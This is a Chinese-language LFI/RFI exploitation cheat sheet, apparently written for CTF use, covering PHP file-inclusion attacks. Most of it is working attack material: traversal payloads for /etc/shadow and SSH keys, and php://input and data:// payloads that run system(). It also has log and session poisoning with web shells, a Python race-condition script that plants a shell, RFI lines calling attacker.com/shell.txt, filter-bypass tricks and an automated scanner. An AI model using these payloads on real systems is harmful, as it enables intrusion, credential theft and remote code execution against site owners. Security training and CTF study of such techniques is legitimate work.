# 文件包含模块 (LFI/RFI)

## 适用场景
- page=xxx、file=xxx、path=xxx 类参数
- 模板引擎文件加载
- 动态包含功能

## 检查清单

```yaml
包含类型:
  - [ ] 本地文件包含 (LFI)
  - [ ] 远程文件包含 (RFI)

常见入口:
  - [ ] page/file/path 参数
  - [ ] template/tpl 参数
  - [ ] lang/language 参数
  - [ ] include/require 参数

利用方式:
  - [ ] 敏感文件读取
  - [ ] PHP 伪协议
  - [ ] 日志包含
  - [ ] Session 包含
  - [ ] 临时文件包含
  - [ ] 远程文件包含

绕过技巧:
  - [ ] 路径截断
  - [ ] 双重编码
  - [ ] 空字节绕过
  - [ ] 路径遍历
```

## 分析流程

### Step 1: 文件包含检测

```bash
# 基础测试
?page=../../../etc/passwd
?file=....//....//....//etc/passwd
?path=..%2f..%2f..%2fetc/passwd

# 判断包含类型
?page=/etc/passwd        # 绝对路径
?page=../etc/passwd      # 相对路径
?page=http://evil.com/   # 远程文件

# 常见敏感文件
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### Step 2: PHP 伪协议

```php
// php://filter - 读取源码（最常用）
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/read=string.rot13/resource=index.php

// php://input - 执行代码（需要 allow_url_include=On）
?page=php://input
POST: <?php system('id'); ?>

// data:// - 执行代码（需要 allow_url_include=On）
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

// php://filter 链 - 绕过过滤
?page=php://filter/convert.iconv.utf-8.utf-16/convert.base64-encode/resource=index.php

// phar:// - 反序列化利用
?page=phar://upload/test.jpg/test.php

// zip:// - 压缩包内文件
?page=zip://upload/test.zip%23shell.php
```

### Step 3: 日志包含

```bash
# Apache 日志
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/apache2/error.log

# Nginx 日志
/var/log/nginx/access.log
/var/log/nginx/error.log

# 利用步骤
# 1. 发送包含恶意代码的请求
curl "http://target.com/<?php system('id'); ?>"
# 或修改 User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# 2. 包含日志文件
?page=/var/log/apache2/access.log&cmd=id
?page=/var/log/nginx/access.log&cmd=id

# 3. 如果日志太大导致失败，尝试 error.log
?page=/var/log/apache2/error.log
```

### Step 4: Session 包含

```bash
# Session 文件位置
/tmp/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php7/sess_PHPSESSID

# 利用步骤
# 1. 找到可控的 session 字段（如用户名）
# 2. 写入恶意代码作为 session 值
# 3. 包含 session 文件

# 示例
# 1. 注册用户名为: <?php system($_GET['cmd']); ?>
# 2. 获取 PHPSESSID: ABC123
# 3. 包含 session 文件
?page=/tmp/sess_ABC123&cmd=id
```

### Step 5: 临时文件包含 (条件竞争)

```python
#!/usr/bin/env python3
"""
条件竞争文件包含
利用 PHP 临时文件进行 RCE
"""

import requests
import threading

url = "http://target.com/index.php"
lfi_url = "http://target.com/index.php?page="

# 恶意文件内容
payload = "<?php system($_GET['cmd']); ?>"

# 临时文件路径模式
# Linux: /tmp/phpXXXXXX
# Windows: C:\Windows\Temp\phpXXXX.tmp

def upload():
    """持续上传文件"""
    while True:
        files = {'file': ('test.txt', payload)}
        try:
            requests.post(url, files=files, timeout=1)
        except:
            pass

def brute_lfi():
    """爆破临时文件名"""
    import string
    charset = string.ascii_letters + string.digits
    
    for c1 in charset:
        for c2 in charset:
            for c3 in charset:
                for c4 in charset:
                    for c5 in charset:
                        for c6 in charset:
                            tmpfile = f"/tmp/php{c1}{c2}{c3}{c4}{c5}{c6}"
                            try:
                                resp = requests.get(
                                    f"{lfi_url}{tmpfile}&cmd=id",
                                    timeout=1
                                )
                                if "uid=" in resp.text:
                                    print(f"[+] Found: {tmpfile}")
                                    return
                            except:
                                pass

# 启动线程
for i in range(10):
    t = threading.Thread(target=upload)
    t.daemon = True
    t.start()

brute_lfi()
```

### Step 6: 远程文件包含 (RFI)

```bash
# 条件：allow_url_include=On

# 基础 RFI
?page=http://attacker.com/shell.txt

# 绕过后缀限制
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt%00
?page=http://attacker.com/shell

# 使用短网址
?page=http://短网址

# shell.txt 内容
<?php system($_GET['cmd']); ?>

# 利用
?page=http://attacker.com/shell.txt&cmd=id
```

### Step 7: 路径遍历绕过

```bash
# 双写绕过
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd

# 编码绕过
..%2f..%2f..%2fetc/passwd          # URL 编码
..%252f..%252f..%252fetc/passwd    # 双重 URL 编码
..%c0%af..%c0%af..%c0%afetc/passwd # UTF-8 编码

# 空字节绕过（PHP < 5.3.4）
../../../etc/passwd%00
../../../etc/passwd%00.php

# 绝对路径
/etc/passwd
file:///etc/passwd

# Windows 路径
..\..\..\..\windows\system32\drivers\etc\hosts
....\\....\\....\\windows\\win.ini
```

## PHP Filter 链攻击

```php
// 使用 php://filter 链进行 RCE
// 无需 allow_url_include

// 工具: https://github.com/synacktiv/php_filter_chain_generator

// 生成 payload
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

// 示例输出
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp

// 使用
?page=php://filter/...长payload.../resource=php://temp&cmd=id
```

## 常见套路与解法

### 套路 1: 基础 LFI

**特征**: page 参数直接拼接文件路径

**Payload**:
```bash
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
```

### 套路 2: 限制后缀

**特征**: 自动添加 .php 后缀

**Payload**:
```bash
# 空字节截断 (PHP < 5.3.4)
?page=../../../etc/passwd%00

# 使用 php://filter
?page=php://filter/read=convert.base64-encode/resource=index

# 长路径截断 (Windows, PHP < 5.2.8)
?page=../../../etc/passwd/./././...(超过256字符)
```

### 套路 3: 限制协议

**特征**: 过滤 php://

**Payload**:
```bash
# 大小写绕过
?page=PHP://filter/read=convert.base64-encode/resource=index.php

# 编码绕过
?page=php%3a//filter/read=convert.base64-encode/resource=index.php
```

### 套路 4: 读取 flag

**特征**: flag 在某个文件中

**Payload**:
```bash
# 常见 flag 位置
?page=php://filter/read=convert.base64-encode/resource=flag
?page=php://filter/read=convert.base64-encode/resource=flag.php
?page=php://filter/read=convert.base64-encode/resource=/flag
?page=php://filter/read=convert.base64-encode/resource=/flag.txt
?page=../../../flag
?page=../../../flag.txt
```

### 套路 5: 代码执行

**特征**: 需要 RCE

**Payload**:
```bash
# php://input
?page=php://input
POST: <?php system('cat /flag'); ?>

# data://
?page=data://text/plain,<?php system('cat /flag'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

# 日志包含
?page=/var/log/apache2/access.log&cmd=cat /flag
```

## 常见敏感文件路径

```yaml
Linux:
  系统文件:
    - /etc/passwd
    - /etc/shadow
    - /etc/hosts
    - /etc/hostname
    - /proc/self/environ
    - /proc/self/cmdline
    - /proc/self/fd/0-9
    
  Web 配置:
    - /var/www/html/.htaccess
    - /etc/apache2/apache2.conf
    - /etc/nginx/nginx.conf
    - /etc/php/7.0/php.ini
    
  日志文件:
    - /var/log/apache2/access.log
    - /var/log/apache2/error.log
    - /var/log/nginx/access.log
    - /var/log/nginx/error.log
    
  SSH:
    - ~/.ssh/id_rsa
    - ~/.ssh/authorized_keys
    - /root/.ssh/id_rsa

Windows:
  系统文件:
    - C:\Windows\win.ini
    - C:\Windows\System32\drivers\etc\hosts
    - C:\boot.ini
    - C:\Windows\System32\config\SAM
    
  Web 配置:
    - C:\xampp\apache\conf\httpd.conf
    - C:\xampp\php\php.ini
```

## 自动化脚本

```python
#!/usr/bin/env python3
"""
LFI 检测脚本
"""

import requests
import base64
from urllib.parse import quote

url = "http://target.com/index.php"
param = "page"

# 测试 payload
payloads = {
    "basic": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "/etc/passwd",
    ],
    "php_filter": [
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "PHP://filter/read=convert.base64-encode/resource=index.php",
    ],
    "windows": [
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "C:\\Windows\\win.ini",
    ],
}

def test_lfi():
    """测试 LFI"""
    print(f"[*] Testing LFI on {url}")
    
    for category, tests in payloads.items():
        print(f"\n[*] Testing {category}...")
        
        for payload in tests:
            try:
                resp = requests.get(
                    url, 
                    params={param: payload},
                    timeout=5
                )
                
                # 检查响应
                if "root:" in resp.text:
                    print(f"[+] LFI Confirmed: {payload}")
                    print(f"    Found /etc/passwd content")
                    
                elif "[fonts]" in resp.text:
                    print(f"[+] LFI Confirmed: {payload}")
                    print(f"    Found win.ini content")
                    
                # 检查 base64 响应
                if len(resp.text) > 10:
                    try:
                        decoded = base64.b64decode(resp.text)
                        if b"<?php" in decoded:
                            print(f"[+] PHP Source Leaked: {payload}")
                    except:
                        pass
                        
            except Exception as e:
                print(f"[-] Error: {e}")

if __name__ == '__main__':
    test_lfi()
```

## 工具速查

```bash
# LFI 测试
?page=php://filter/read=convert.base64-encode/resource=index.php

# 常用工具
# https://github.com/synacktiv/php_filter_chain_generator
# https://github.com/Swissky/PayloadsAllTheThings/tree/master/File%20Inclusion

# Base64 解码
echo "PD9waHAgLi4u" | base64 -d
```
